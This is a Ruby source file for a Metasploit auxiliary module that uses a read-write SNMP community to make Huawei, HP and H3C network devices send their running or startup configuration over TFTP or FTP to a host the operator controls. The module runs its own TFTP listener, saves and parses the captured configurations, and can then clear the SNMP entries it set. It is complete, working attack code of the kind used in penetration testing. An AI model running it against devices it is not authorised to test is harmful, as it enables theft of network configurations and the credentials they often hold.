require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::SNMPClient
	include Msf::Auxiliary::HH3C
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'		=> 'Huawei/HP/3H3C SNMP Configuration Grabber',
			'Description' => %q{
				This module will download the startup or running configuration
				from a Huawei or HP/H3C device using SNMP and TFTP or FTP. A
				read-write SNMP community is required.

				If you want Metasplot to process the received files the target
				must be able to connect back to the Metasploit system. The use of
				NAT will cause the transfer to fail.
			},
			'Author'	  =>
				[
					'pello <fropert[at]packetfault.org>', 'hdm', 'Kurt Grutzmacher <grutz[at]jingojango.net>'
				],
			'References'  =>
			[
				[ 'URL', 'http://www.h3c.com/portal/Products___Solutions/Technology/System_Management/Configuration_Example/200912/656452_57_0.htm' ],
			],
			'License'	 => MSF_LICENSE
			)

			register_options([
				OptEnum.new("OPTYPE", [true, "Grab the startup (6) or running (3) configuration", "3", ["3","6"]]),
				OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files (disabled by default)"]),
				OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ]),
				OptString.new('RUNTFTPD', [true, "Start the TFTP server", "true", ["true", "false"]]),
				OptString.new('CLEARSNMP', [true, "Remove the SNMP entries (if successful)", "true", ["true", "false"]]),
				OptString.new('MIBSTYLE', [true, "Use the new or old style MIB (h3c vs hh3c)", "new", ["new", "old"]]),
				OptString.new('FTPUSER', [false, "FTP username, if enabled will not start TFTP"]),
				OptString.new('FTPPASS', [false, "FTP password"]),
			], self.class)
	end


	#
	# Start the TFTP Server
	#
	def setup
		# Setup is called only once

		if datastore['FTPUSER']
			print_debug('FTPUSER set, not starting TFTP server')
			@start_tftp = false
		else
			@start_tftp = datastore['RUNTFTPD']
		end

		if @start_tftp
			print_status("Starting TFTP server...")
			@tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
			@tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
			@tftp.start
			add_socket(@tftp.sock)
		end

		@main_thread = ::Thread.current

		print_status("Scanning for vulnerable targets...")
	end

	#
	# Kill the TFTP server
	#
	def cleanup
		# Cleanup is called once for every single thread
		if @start_tftp
			if ::Thread.current == @main_thread
				# Wait 5 seconds for background transfers to complete
				print_status("Providing some time for transfers to complete...")
				Rex::ThreadSafe.sleep(5)

				print_status("Shutting down the TFTP service...")
				if @tftp
					@tftp.close rescue nil
					@tftp = nil
				end
			end
		end
	end

	#
	# Callback for incoming files
	#
	def process_incoming(info)
		return if not info[:file]
		name = info[:file][:name]
		data = info[:file][:data]
		from = info[:from]
		return if not (name and data)

		# Trim off IPv6 mapped IPv4 if necessary
		from = from[0].dup
		from.gsub!('::ffff:', '')

		print_status("Incoming file from #{from} - #{name} #{data.length} bytes")

		# Save the configuration file if a path is specified
		if datastore['OUTPUTDIR']
			name = "#{from}.txt"
			::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
			path = ::File.join(datastore['OUTPUTDIR'], name)
			::File.open(path, "wb") do |fd|
				fd.write(data)
			end
			print_status("Saved configuration file to #{path}")
		end

		# Toss the configuration file to the parser
		hh3c_config_eater(from, 161, data)
	end

	def run_host(ip)

		begin
			if datastore['FTPUSER'] != ''
				protocol = 1
			else
				protocol = 2  # TFTP
			end

			optype   = datastore['OPTYPE'].to_i
			filename = "#{ip}.txt"
			lhost	= datastore['LHOST'] || Rex::Socket.source_address(ip)

			if datastore['MIBSTYLE'] == "new"
				# newstyle
				hh3cCfgOperateType			= "1.3.6.1.4.1.25506.2.4.1.2.4.1.2."
				hh3cCfgOperateProtocol		= "1.3.6.1.4.1.25506.2.4.1.2.4.1.3."
				hh3cCfgOperateFileName		= "1.3.6.1.4.1.25506.2.4.1.2.4.1.4."
				hh3cCfgOperateServerAddress = "1.3.6.1.4.1.25506.2.4.1.2.4.1.5."
				hh3cCfgOperateUserName		= "1.3.6.1.4.1.25506.2.4.1.2.4.1.6."
				hh3cCfgOperateUserPassword  = "1.3.6.1.4.1.25506.2.4.1.2.4.1.7."
				hh3cCfgOperateRowStatus		= "1.3.6.1.4.1.25506.2.4.1.2.4.1.9."
			else
				# oldstyle
				hh3cCfgOperateType			= "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.2."
				hh3cCfgOperateProtocol		= "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.3."
				hh3cCfgOperateFileName		= "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.4."
				hh3cCfgOperateServerAddress = "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.5."
				hh3cCfgOperateUserName		= "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.6."
				hh3cCfgOperateUserPassword  = "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.7."
				hh3cCfgOperateRowStatus		= "1.3.6.1.4.1.2011.10.2.4.1.2.4.1.9."
			end

			session = rand(255) + 1

			snmp = connect_snmp

			print_status("Attempting to acquire configuration from #{ip}...")

			vbl = [
				SNMP::VarBind.new("#{hh3cCfgOperateType}#{session}" , SNMP::Integer.new(optype.to_i)),
				SNMP::VarBind.new("#{hh3cCfgOperateProtocol}#{session}" , SNMP::Integer.new(protocol.to_i)),
				SNMP::VarBind.new("#{hh3cCfgOperateFileName}#{session}", SNMP::OctetString.new(filename)),
				SNMP::VarBind.new("#{hh3cCfgOperateServerAddress}#{session}", SNMP::IpAddress.new(lhost))
			]

			if datastore['FTPUSER']
				vbl << SNMP::VarBind.new("#{hh3cCfgOperateUserName}#{session}", SNMP::OctetString.new(datastore['FTPUSER']))
				vbl << SNMP::VarBind.new("#{hh3cCfgOperateUserPassword}#{session}", SNMP::OctetString.new(datastore['FTPPASS']))
			end

			vbl << SNMP::VarBind.new("#{hh3cCfgOperateRowStatus}#{session}", SNMP::Integer.new(4))
			varbind = SNMP::VarBindList.new(vbl)
			value = snmp.set(varbind)

			# cleanup
			if datastore['CLEARSNMP']
				print_debug("Waiting 10 seconds before clearing")
				Rex::ThreadSafe.sleep(10)
				varbind = SNMP::VarBind.new("#{hh3cCfgOperateRowStatus}#{session}", SNMP::Integer.new(6))
				value = snmp.set(varbind)
			end

			disconnect_snmp

		rescue ::SNMP::RequestTimeout, ::Rex::ConnectionRefused
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
		end
	end

end

=begin
http://www.h3c.com/portal/Products___Solutions/Technology/System_Management/Configuration_Example/200912/656452_57_0.htm#_Toc247357228

For a node in the H3C new-style MIB files, its name starts with hh3c,
and its OID starts with 1.3.6.1.4.1.25506; for a node in the H3C
compatible-style MIB files, its name starts with h3c, and its OID starts
with 1.3.6.1.4.1.2011.10. For example, node hh3cCfgOperateType with the
OID of 1.3.6.1.4.1.25506.2.4.1.2.4.1.2 is in file hh3c-config-man.mib, and
node h3cCfgOperateType with the OID of 1.3.6.1.4.1.2011.10.2.4.1.2.4.1.2
is in file h3c-config-man.mib. Both of the two nodes indicate the same
variable in the agent, but they are in different MIB style.

By default, devices use H3C new-style MIB files;
=end
